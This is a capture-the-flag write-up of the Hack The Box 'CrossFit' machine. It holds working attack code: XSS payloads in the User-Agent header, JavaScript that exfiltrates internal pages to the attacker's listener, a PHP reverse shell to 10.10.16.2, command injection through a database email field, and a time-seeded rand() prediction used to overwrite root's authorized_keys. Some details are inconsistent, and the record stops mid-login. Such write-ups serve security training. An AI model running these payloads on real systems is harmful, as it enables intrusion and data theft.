### Enumeration

With the first [Nmap](https://nmap.org/) we try to find out the open port of the target:

```bash
$ nmap -p- -vvv -Pn -n --min-rate 5000 10.10.10.208

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

The second scan will be to try to identify the services and versions running on the discovered ports

```bash

$ nmap -p21,22,80 -sCV -oN targeted 10.10.10.208

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later

```

We could try to inspect the `ssl-cert` of port 21 with [openssl](https://www.openssl.org/).

```bash
openssl s_client -connect 10.10.10.208:21 -starttls ftp
```

And we find interesting data

```bash
<SNIP>
... CN=\*.crossfit.htb, emailAddress=<info@gym-club.crossfit.htb>
<SNIP>
```

We found a potential subdomain, In case virtual hosting is being done we need to add these to the `/etc/hosts` file.

Navigating around the website we found some fields in which we could try to a [Cross-Site Scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)

Specifically at the time of leaving a comment in the path `/blog-single.php`

Then, performing the following request:

```
POST /blog-single.php HTTP/1.1

```

Oops, we got an anti-hacker warning.

![](/src/app/blog/CrossFit/xss_warning.png)

Then, they are storing information about our request and we could think that they are rendering it in some administrative panel. So, they may be a bit interested in our `User-Agent`.

What if we send a little gift there?

```bash
User-Agent: <script src='http://10.10.16.2:8081'></script>
```

We will be listening on port `8081` in the event that we receive a request.

```bash
$ nc -nlvp 8081
Listening on 0.0.0.0 8081

Connection received on 10.10.10.208 34398
GET / HTTP/1.1
Host: 10.10.16.2:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://gym-club.crossfit.htb/security_threat/report.php
Connection: keep-alive
```

Indeed, the target attempted to load a resource hosted on our machine.

Before giving it something to manipulate, we notice that in the server's response we get

```bash
Control-Allow-Origin: http://gym-club.crossfit.htb
```

But only when in the request the origin is

```bash
Origin: http://gym-club.crossfit.htb
```

Then in this way we have the possibility to list valid subdomains of the system.

To fuzz subdomains in this way we will use [ffuf](https://github.com/ffuf/ffuf) and a [seclist](https://github.com/danielmiessler/SecLists) subdomain dictionary.

```bash
ffuf -u http://gym-club.crossfit.htb \
 -w subdomains-top1million-5000.txt \
 -H "Origin: http://FUZZ.crossfit.htb" \
 -mr "Access-Control-Allow-Origin" \
 -ignore-body
```

And ffuf reports us the `ftp` subdomain.

![](/src/app/blog/CrossFit/ffuf_report.png)

ffuf reports the ftp subdomain, unfortunately, adding `ftp.crossfit.htb` to `/etc/hosts` we do not get any interesting response, which makes us think that maybe the domain exists but only internally.

---

### Exploitation

So taking advantage of the fact that we can inject code through the `User-Agent` of the request, let's try to find out what's there.

First, we are going to use JavaScript to try to get the base64 HTML code of the domain we want to review, in this case `ftp.crossfit.htb`.

```js
const target = 'http://ftp.crossfit.htb/'

async function executeRequests() {
  const ftp_crossfit_htb = await fetch(target, { method: 'GET' })
  const encodedResponse = btoa(await ftp_crossfit_htb.text())
  await fetch(`http://10.10.16.2:8081/${encodedResponse}`)
}

executeRequests()
```

Listening with Python on port `8081` we get

```bash
10.10.10.208 - - [03/May/2025 21:27:06] "GET /PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+RlRQIEhvc3RpbmcgLSBBY2NvdW50IE1hbmFnZW1lbnQ8L3RpdGxlPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvdHdpdHRlci1ib290c3RyYXAvNC4wLjAtYWxwaGEvY3NzL2Jvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CjwvaGVhZD4KPGJvZHk+Cgo8YnI+CjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIgbWFyZ2luLXRiIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icHVsbC1sZWZ0Ij4KICAgICAgICAgICAgICAgIDxoMj5GVFAgSG9zdGluZyAtIEFjY291bnQgTWFuYWdlbWVudDwvaDI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJwdWxsLXJpZ2h0Ij4KICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiIGhyZWY9Imh0dHA6Ly9mdHAuY3Jvc3NmaXQuaHRiL2FjY291bnRzL2NyZWF0ZSI+IENyZWF0ZSBOZXcgQWNjb3VudDwvYT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICAKICAgIDx0YWJsZSBjbGFzcz0idGFibGUgdGFibGUtYm9yZGVyZWQiPgogICAgICAgIDx0cj4KICAgICAgICAgICAgPHRoPk5vPC90aD4KICAgICAgICAgICAgPHRoPlVzZXJuYW1lPC90aD4KICAgICAgICAgICAgPHRoPkNyZWF0aW9uIERhdGU8L3RoPgogICAgICAgICAgICA8dGggd2lkdGg9IjI4MHB4Ij5BY3Rpb248L3RoPgogICAgICAgIDwvdHI+CgogICAgICAgIAogICAgPC90YWJsZT4KCiAgICAKCjwvZGl2PgoKPC9ib2R5Pgo8L2h0bWw+Cg== HTTP/1.1" 404 -
```

Is our code, if we decode it we get perfectly readable HTML.

```bash
echo ...bPCFET0NUWVBFIGh0bWw... | base64 -d
```

![](/src/app/blog/CrossFit/gym-club-crossfit-htb.png)

Obviosuly, we cannot create an account by simple clicking on the "Create New Account" button.
But we can notice when hovering that, when clicking, it will request a file from `/accounts/create`, so let's try to get that HTML code the same way we did before but changing the target.

```js
target = 'http://ftp.crossfit.htb/accounts/create'
```

![](/src/app/blog/CrossFit/create_new_account.png)

Checking the code:

```html
<form action="http://ftp.crossfit.htb/accounts" method="POST">
  <input
    type="hidden"
    name="_token"
    value="nz3nmToo7Q8GVyMNYojk7dd64wYhjRgV08ALt1ze"
  />
  <div class="row">
    <div class="col-xs-12 col-sm-12 col-md-12">
      <div class="form-group">
        <strong>Username:</strong>
        <input
          type="text"
          name="username"
          class="form-control"
          placeholder="Username"
        />
      </div>
    </div>
    <div class="col-xs-12 col-sm-12 col-md-12">
      <div class="form-group">
        <strong>Password:</strong>
        <input
          type="password"
          name="pass"
          class="form-control"
          placeholder="Password"
        />
      </div>
    </div>
    <div class="col-xs-12 col-sm-12 col-md-12 text-center">
      <button type="submit" class="btn btn-primary">Submit</button>
    </div>
  </div>
</form>
```

let's try to make a request to create an account, we must keep in mind:

- The request is aimed to `http://ftp.crossfit.htb/accounts`
- The fields to send are `username`, `pass` and `_token`.
- Most likely the token is dynamic so we need to capture it in each request.

With this in mind we are going to make some changes to our script.

```js
const target = 'http://ftp.crossfit.htb/accounts'

async function executeRequests() {
  const response1 = await fetch(target + '/create', {
    method: 'GET',
    credentials: 'include',
  })

  const responseText1 = await response1.text()
  const parser = new DOMParser()
  const doc = parser.parseFromString(responseText1, 'text/html')
  const token = doc.querySelector('input[name="_token"]').value

  const data = new URLSearchParams()
  data.append('username', 'entr0phy4')
  data.append('pass', 'entr0phy4')
  data.append('_token', token)

  const response2 = await fetch(target, {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: data.toString(),
  })

  const responseText2 = await response2.text()

  const encodedResponse = btoa(responseText2)
  await fetch(`http://10.10.16.2:8081/${encodedResponse}`)
}

executeRequests()
```

First, we make a request to `/accounts/create`, we parse the response and extract the token, then, we perform a POST request to `/accounts` sending the data of the new account we want to create, and finally, we send to our host machine the response of that request.

If everything went well we should see our account:

![](/src/app/blog/CrossFit/account_created.png)

Creating this account was in our interest because if we remember the `Nmap` scan, port 21 it's open.

So let's try to connect via `ftp` with [lftp](https://lftp.yar.ru/)

```bash
‚ùØ lftp 10.10.10.208
lftp 10.10.10.208:~> login entr0phy4
Password:
lftp entr0phy4@10.10.10.208:~>
```

We were able to connect, but when we try to list the directories we get the following error

```bash
lftp entr0phy4@10.10.10.208:~> ls
ls: Fatal error: Certificate verification: The certificate is NOT trusted. The certificate issuer is unknown.  (25:EC:D2:FE:6C:9D:77:04:EC:7D:D7:92:87:67:4B:C3:8D:0E:CB:CE)
```

Luckily, with lftp we can disable certificate verification very easily typing:

```bash
set ssl:verify-certificate false
```

And now, we can list the directories

```bash
lftp entr0phy4@10.10.10.208:~> ls
drwxrwxr-x  2 33 1002 4096 May 03 16:30 development-test
drwxr-xr-x 13 0  0    4096 May 07  2020 ftp
drwxr-xr-x  9 0  0    4096 May 12  2020 gym-club
drwxr-xr-x  2 0  0    4096 May 01  2020 html
```

The forlders we found remind me of the subdomains we have been checking, so something makes me think that `development-test` is another one, but if we add it to `/etc/hosts` we still don't see different content.

Now, we have write capability in `development-test`, so our idea will be to try to upload a reverse shell and then try to request it through the vulnerable `User-Agent` field.

```php
<?php
  system("bash -c 'bash -i >&/dev/tcp/10.10.16.2/9001 0>&1'")
?>
```

Having this file `r.php` we only have to upload it via `ftp`

```bash
lftp entr0phy4@10.10.10.208:/development-test> put r.php
73 bytes transferred in 3 seconds (27 B/s)
lftp entr0phy4@10.10.10.208:/development-test> ls
-rw-r--r--    1 1002     1002           73 May 04 00:33 r.php
```

It's done, if we listen in with netcat on the port 9001

```bash
nc -nlvp 9001
```

and send the following `User-Agent`

```bash
User-Agent:<script src="http://development-test.crossfit.htb/r.php"></script>
```

We successfully received the connection.

```bash
‚ùØ nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.10.208 49684
bash: cannot set terminal process group (774): Inappropriate ioctl for device
bash: no job control in this shell
www-data@crossfit:/var/www/development-test$
```

The next step would be to make a proper [treatment of the teletypewriter (TTY)](/blog/treatment-of-the-tty).

---

### Lateral movements

Being `www-data` user we don't really have many options, thinking about which other user to become we find our options:

```bash
www-data@crossfit:/$ grep "sh$" /etc/passwd
root:x:0:0:root:/root:/bin/bash
isaac:x:1000:1000:,,,:/home/isaac:/bin/bash
hank:x:1004:1006::/home/hank:/bin/bash
```

If we see where the flag is, we can focus on `hank`, but before, we notice that in the `passwd` there is also the user `ftpadm` and this user usually saves credentials in `/etc`

```bash
ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin
```

So we tried filtering with grep but got nothing.

```bash
www-data@crossfit:/$ grep -r -i 'ftpadm' /etc/ 2>/dev/null
/etc/subuid-:ftpadm:296608:65536
/etc/subgid:ftpadm:296608:65536
/etc/group-:ftp:x:116:isaac,ftpadm
/etc/group-:ftpadm:x:1004:ftp
/etc/subuid:ftpadm:296608:65536
/etc/vsftpd/user_conf/ftpadm:guest_username=ftpadm
/etc/group:ftp:x:116:isaac,ftpadm
/etc/group:ftpadm:x:1004:ftp
/etc/passwd-:ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin
/etc/subgid-:ftpadm:296608:65536
/etc/ssh/sshd_config:DenyUsers ftpadm
/etc/passwd:ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin
```

But checking information about `/proc` filesystem, we find that have set the option `hidepid=2`, It controls the visibility of the process information for users other than the process owner.

```bash
www-data@crossfit:/$ mount | grep proc
proc on /proc type proc ( ... ,hidepid=2) # <-
...
```

We must keep in mind that, user migration would imply the possibility of listing even more sensitive files.

So let's focus on the user with the flag

```bash
www-data@crossfit:/$ find /home/ -name user.txt 2>/dev/null
/home/hank/user.txt
```

Filtering files that are related to hank we found something interesting

```bash
www-data@crossfit:/$ find / -name "*hank*" 2>/dev/null
/usr/bin/perlthanks
/usr/share/man/man1/perlthanks.1.gz
/home/hank
/etc/ansible/playbooks/adduser_hank.yml
/var/mail/hank
```

`adduser_hank.yml` looks suspicious

```bash
www-data@crossfit:/$ cat /etc/ansible/playbooks/adduser_hank.yml
---

- name: Add new user to all systems
  connection: network_cli
  gather_facts: false
  hosts: all
  tasks:
    - name: Add the user 'hank' with default password and make it a member of the 'admins' group
      user:
        name: hank
        shell: /bin/bash
        password: $6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/
        groups: admins
        append: yes
```

In fact, we found encrypted credentials for the user hank. Let's copy it and try to break it with john the ripper tool.

```bash
‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"

Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We break the password, let's try to migrate to user `hank:powerpuffgirls`.
Being `hank` we can read `/home/hank/user.txt` and the first part of the machine is done.

Keeping in mind the option `hidepid=2` is set, let's try to get information about `ftpadm` user again.

```bash
hank@crossfit:/$ grep -r -i ftpadm /etc/ 2>/dev/null
...
/etc/pam.d/vsftpd:auth sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
...
...
```

Now we have obtained credentials, let's try to connect to ftp with

```bash
lftp ftpadm@10.10.10.208:/> ls
drwxrwx---    2 1003     116          4096 Sep 21  2020 messages
```

We were able to enter but only found a messages folder with nothing useful in it.

As we need to break everything we start looking for information to become the user `isaac` and we find something in `/home/isaac/send_updates`

```php
hank@crossfit:/home/isaac/send_updates$ cat send_updates.php
<?php
/***************************************************

 ***************************************************/
require("vendor/autoload.php");
require("includes/functions.php");
require("includes/db.php");
require("includes/config.php");
use mikehaertl\shellcommand\Command;

if($conn)
{
    $fs_iterator = new FilesystemIterator($msg_dir);

    foreach ($fs_iterator as $file_info)
    {
        if($file_info->isFile())
        {
            $full_path = $file_info->getPathname();
            $res = $conn->query('SELECT email FROM users');
            while($row = $res->fetch_array(MYSQLI_ASSOC))
            {
                $command = new Command('/usr/bin/mail');
                $command->addArg('-s', 'CrossFit Club Newsletter', $escape=true);
                $command->addArg($row['email'], $escape=true);

                $msg = file_get_contents($full_path);
                $command->setStdIn('test');
                $command->execute();
            }
        }
        unlink($full_path);
    }
}

cleanup();
?>
```

The script basically are creating a `FilesystemIterator` object to iterate over files in `$msg_dir` and execute a sql query to set the recipient's of the email to send.

Connecting the pieces of the puzzle, we can guess that `$msg_dir` refers to the ftp server messages folder.

If we somehow get access to the database we could concatenate commands to the email so that the script execute them for us and this will not be very difficult, because looking in the directory `/var/www/gym-club/` we find a `db.php` with credentials in clear text...

```bash
www-data@crossfit:/var/www/gym-club$ cat db.php
...
$dbuser = "crossfit";
$dbpass = "oeLoo~y2baeni";
$db = "crossfit";
...
```

Well, the frist phase of our plan is to pass this validation:

```php
 if($file_info->isFile())
```

Let's upload a file being `ftpadm:8W)}gpRJvAmnb` in messages folder.

```bash
lftp ftpadm@10.10.10.208:/messages> put file.txt
8 bytes transferred in 3 seconds (3 B/s)

lftp ftpadm@10.10.10.208:/messages> ls
-rw-r--r--    1 1003     1004            8 May 04 15:53 file.txt
```

Once the file has been uploaded, the second phase is create our malicious sql query.

Let's connect to database

```bash
hank@crossfit:/var/www/gym-club$ mysql -ucrossfit -p

We select the database `crossfit` typing; `use crossfit;`, and our target will be the `email` field of the `users` table.

```bash
MariaDB [crossfit]> describe users;
+-------+---------------------+------+-----+---------+----------------+
| Field | Type                | Null | Key | Default | Extra          |
+-------+---------------------+------+-----+---------+----------------+
| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| email | varchar(320)        | YES  |     | NULL    |                |
+-------+---------------------+------+-----+---------+----------------+
2 rows in set (0.001 sec)Now the good stuff starts.
```

Let's insert our little payload

```mysql
insert into users(email) values("; bash -c 'bash -i >&/dev/10.10.16.2/9001 0>&1';");
```

And we have it ready:

```bash
MariaDB [crossfit]> select * from users;
+----+--------------------------------------------------+
| id | email                                            |
+----+--------------------------------------------------+
| 52 | ; bash -c 'bash -i >&/dev/10.10.16.2/9001 0>&1'; |
+----+--------------------------------------------------+
1 row in set (0.000 sec)
```

After a while, in our listener:

```bash
‚ùØ nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.10.208 34960
bash: cannot set terminal process group (12608): Inappropriate ioctl for device
bash: no job control in this shell
isaac@crossfit:~$
```

We are `isaac`, remember [treatment of the teletypewriter (TTY)](/blog/treatment-of-the-tty), this is for better user experince when manipulating the terminal.

<TopTip>
  Keep in mind the `cleanup()` function at the end of the script. If you don't
  get a connection, check the file you uploaded to messages folder may not have
  been deleted.
</TopTip>

Now the good stuff starts.

### Privilege escalation

As a first instance, being isaac we are part of the `staff` group.

```bash
isaac@crossfit:~$ groups
isaac staff ftp admins
```

So we could have more scope keeping in mind the `hidepid=2` that is configured, this time, we use [pspy](https://github.com/DominicBreuker/pspy) to enumerate processes, we can download the copiled binary from github page.

Once we have the binary we will serve it with python to transfer it to the victim machine

```bash
‚ùØ ls -l
total 1204
-rwxr-xr-x 1 entr0phy4 entr0phy4 1229588 May  3 17:35 pspy64
‚ùØ python -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
```

Being `isaac` and in the `/tmp/` directory:

```bash
isaac@crossfit:/tmp$ curl http://10.10.16.2:8081/pspy64 > pspy
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1200k  100 1200k    0     0   477k      0  0:00:02  0:00:02 --:--:--  477k
```

Once we have the binary, we give it execution permissions

```bash
chmod +x pspy
```

And we run it with the flag `-f` to print file system events

![](/src/app/blog/CrossFit/pspy_execution.png)

Over time, we get a lot of information, but something interesting is this binary called `dbmsg`

```
2025/05/04 13:00:01 FS:                 OPEN | /usr/bin/dbmsg
2025/05/04 13:00:01 CMD: UID=1000  PID=13094 |
2025/05/04 13:00:01 FS:               ACCESS | /usr/bin/dbmsg
2025/05/04 13:00:01 FS:               ACCESS | /usr/bin/dbmsg
```

this is of interest to us, we are going to perform a little surgery on our machine to binary `database message`

First step is to send it to our host machine.

Let's do this with netcat, in our machine we are going to redirect the request we receive to a `dbmsg` file

```bash
‚ùØ nc -nlvp 9001 > dbmsg
Listening on 0.0.0.0 9001
```

And on the victim machine redicting the content of `/usr/bin/dbmsg` to our linstener.

```bash
isaac@crossfit:/tmp$ nc 10.10.16.2 9001 < /usr/bin/dbmsg
```

So, for our surgery we need tools, let's use [ghidra](https://ghidra-sre.org/) to this.

Create a new project

![](/src/app/blog/CrossFit/ghydra/new_project.png)

Import a `dbmsg` as new file

![](/src/app/blog/CrossFit/ghydra/new_file.png)

Analyze the file with default settings, and we can start

first find the function `main` on the folder `FUNCTIONS` in the sidebar

![](/src/app/blog/CrossFit/ghydra/main_function.png)

Let's break the code

```c++
void main(void)

{
  __uid_t _Var1;
  time_t tVar2;

  _Var1 = geteuid();
  if (_Var1 != 0) {
    fwrite("This program must be run as root.\n",1,0x22,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  process_data();
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Pseudo code:

```bash
# 1. Checks if it is being run as root.
# 2. Seeds the random number generator with the current time.
# 3. Calls a function named process_data().
# 4. Exits the program.
```

We are curious about the "randomly" generated seed, which is no really, because if it is using the current time, we could try to travel through it and get the value for the next few minutes, but for now let's move on the `process_data()` function.

```c
void process_data(void)
{
  ...
  ...
  local_20 = mysql_init(0);
  if (local_20 == 0) {
    fwrite("mysql_init() failed\n",1,0x14,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  lVar3 = mysql_real_connect(local_20,"localhost","crossfit","oeLoo~y2baeni","crossfit",0,0,0);
  if (lVar3 == 0) {
    exit_with_error(local_20);
  }
  iVar1 = mysql_query(local_20,"SELECT * FROM messages");
  if (iVar1 != 0) {
    exit_with_error(local_20);
  }
  local_28 = mysql_store_result(local_20);
  if (local_28 == 0) {
    exit_with_error(local_20);
  }
  local_30 = zip_open("/var/backups/mariadb/comments.zip",1,&local_4c);
  if (local_30 != 0) {
    while (local_38 = (long *)mysql_fetch_row(local_28), local_38 != (long *)0x0) {
      if ((((*local_38 != 0) && (local_38[1] != 0)) && (local_38[2] != 0)) && (local_38[3] != 0)) {
        lVar3 = *local_38;
        uVar2 = rand();
        snprintf(local_c8,0x30,"%d%s",(ulong)uVar2,lVar3);
        sVar5 = strlen(local_c8);
        md5sum(local_c8,sVar5 & 0xffffffff,local_f8);
        snprintf(local_98,0x30,"%s%s","/var/local/",local_f8);
        local_40 = fopen(local_98,"w");
        if (local_40 != (FILE *)0x0) {
          fputs((char *)local_38[1],local_40);
          fputc(0x20,local_40);
          fputs((char *)local_38[3],local_40);
          fputc(0x20,local_40);
          fputs((char *)local_38[2],local_40);
          fclose(local_40);
          if (local_30 != 0) {
            printf("Adding file %s\n",local_98);
            local_48 = zip_source_file(local_30,local_98,0,0);
            if (local_48 == 0) {
              uVar4 = zip_strerror(local_30);
              fprintf(stderr,"%s\n",uVar4);
            }
            else {
              lVar3 = zip_file_add(local_30,local_f8,local_48,0x800);
              if (lVar3 < 0) {
                zip_source_free(local_48);
                uVar4 = zip_strerror(local_30);
                fprintf(stderr,"%s\n",uVar4);
              }
              else {
                uVar4 = zip_strerror(local_30);
                fprintf(stderr,"%s\n",uVar4);
              }
            }
          }
        }
      }
    }
    mysql_free_result(local_28);
    delete_rows(local_20);
    mysql_close(local_20);
    if (local_30 != 0) {
      zip_close(local_30);
    }
    delete_files();
    return;
  }
  zip_error_init_with_code(local_68,local_4c);
  uVar4 = zip_error_strerror(local_68);
  fprintf(stderr,"%s\n",uVar4);
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

Pseudo code:

1. Connects to a MySQL database.
2. Fetches all rows from the messages table.
3. For each valid row, it:

   - 3.1. Creates a filename using a hash (MD5).
   - 3.2. Writes specific fields into a temporary file.
   - 3.3. Adds that file to a ZIP archive.

4. Cleans up: closes DB, ZIP archive, deletes files, and removes database rows.

### line-by-line breakdown

```c
local_20 = mysql_init(0);

if (local_20 == 0) {
  fwrite("mysql_init() failed\n",1,0x14,stderr);
  exit(1);
}
```

Initializes a MySQL connection object and if init fails, print error and exit

```c
lVar3 = mysql_real_connect(local_20,"localhost","crossfit","oeLoo~y2baeni","crossfit",0,0,0);

if (lVar3 == 0) {
  exit_with_error(local_20);
}
```

Connects to `crossfit` database. If connection fails, exit.

```c
mysql_query(local_20,"SELECT * FROM messages");

local_28 = mysql_store_result(local_20);

if (local_28 == 0) {
  exit_with_error(local_20);
}
```

Executes query to get all messages, stores result in `local_28`, if result is `null`, exit.

```c
local_30 = zip_open("/var/backups/mariadb/comments.zip", 1, &local_4c);
```

Opens or create a ZIP file in update mode

```c
while ((local_38 = (long *)mysql_fetch_row(local_28)) != NULL)
```

Iterate over each row of messages tables

```c
if ((((*local_38 != 0) && (local_38[1] != 0)) && (local_38[2] != 0)) && (local_38[3] != 0)) {
```

Skips rows with NULL fields in the first 4 columns, we can visualize this more easily in the database

```bash
MariaDB [crossfit]> describe messages;
...
+---------+
| id      | # local_38[0]
| name    | # local_38[1]
| email   | # local_38[2]
| message | # local_38[3]
+---------+
...
```

For each message in database:

```c
lVar3 = *local_38;
```

Store the ID of the message in `lVar3`.

```c
uVar2 = rand();
```

Store a "random" value in `uVar2` but it's really using as seed the current time, as we saw in the `main` function

```c
snprintf(local_c8, 0x30, "%d%s", (ulong)uVar2, lVar3);
```

Setting a variable called `local_c8` that will store the value of `uVar2` + `lVar3`, basically `random_value_based_in_current_time + ID_of_message`.

```c
md5sum(local_c8, strlen(local_c8), local_f8);
```

It is getting the `md5` hash of the previusly computed value and set in `local_f8`

```c
snprintf(local_98, 0x30, "%s%s", "/var/local/", local_f8);
```

Sets `local_98` and saves `/var/local/value_computed_and_hashed`

```c
local_40 = fopen(local_98,"w");
fputs((char *)local_38[1], local_40); // write column 1
fputc(0x20, local_40);                // space
fputs((char *)local_38[3], local_40); // write column 3
fputc(0x20, local_40);                // space
fputs((char *)local_38[2], local_40); // write column 2
fclose(local_40);
```

Reads the file it processes and writes the contents of the message in the in the following order:

```
name<space>message<space>email
```

Knowing how the binary works up to this point, we can already devise a plan.

Our idea will be to store our public key in the messages table, so that when reading it we will use a symbolic link to write it directly to the `authorized_keys` file of root.

This will allow us to log in via `ssh` as root user without using password.

First, we are going to save our public key in the database in the respective orden, let's generate that with `ssh-keygen`

```bash
‚ùØ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/entr0phy4/.ssh/id_ed25519):
Enter passphrase for "/home/entr0phy4/.ssh/id_ed25519" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/entr0phy4/.ssh/id_ed25519
Your public key has been saved in /home/entr0phy4/.ssh/id_ed25519.pub
```

We did not establish any passwords

```bash
  name                   message                     email
ssh-ed25519 ACCOC3NzaC1lZDI...wOm2dAcoHFsD/B3 entr0phy4@archlinux
```

Let's create our SQL query.

```bash
MariaDB [crossfit]> INSERT INTO messages(id, name, email, messages)
                   VALUES("1234", "ssh-ed25519", "entr0phy4@archlinux", "C3Nza...b6tQzh");
Query OK, 1 row affected (0.002 sec)
```

Second,we need to find a way to obtain a computed value of the future. With the following c++ script we can replicate the behavior of the binary when generating a "random" value, only in our case the value will be generated for one minute after the current one, i.e we travel one minute into the future.

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(void) {
  time_t current_time = time(NULL);
  int seed = current_time - (current_time % 60) + 61;
  srand(seed);
  printf("%d", rand());
  return 0;
}
```

to compile with `gcc`

```bash
gcc get_time.c -o get_time
```

and execute

```bash
isaac@crossfit:/tmp$ echo -n "$(./get_time)"
1590912600
```

With this and the ID `9999` we set for the message with our ssh key, we can compute the value `random_value_based_in_current_time + ID_of_message` to later obtain the md5 hash.

```bash
isaac@crossfit:/tmp$ echo -n "$(./get_time)1234" | md5sum
df355e5f7e76a61fc57972bf6604ee6d
```

the next phase is to create our symbolic link in `/var/local/`

```bash
ln -s -f /root/.ssh/authorized_keys /var/local/df355e5f7e76a61fc57972bf6604ee6d
```

<TopTip>
  We must keep in mind that the machine is configured to delete our files from
  `/tmp/` perodically and all the above process must be done within 1 minute,
  because the computed hash depends on the current minute and focuses on the
  next one. So, 1. Prepare the sql insert with your ssh private key, 2. Transfer
  the `get_time.c` script and compile with `gcc`, 3. Execute compiled `get_time`
  and get the md5 hash and 4. Create symbolic link aim to
  `/root/.ssh/authorized_keys`
</TopTip>

If all goes well, when we try to connect to the machine with the root user:

```bash
‚ùØ ssh root@10.10.10.208
The authenticity of host '10.10.10.208 (10.10.10.208)' can't be established.
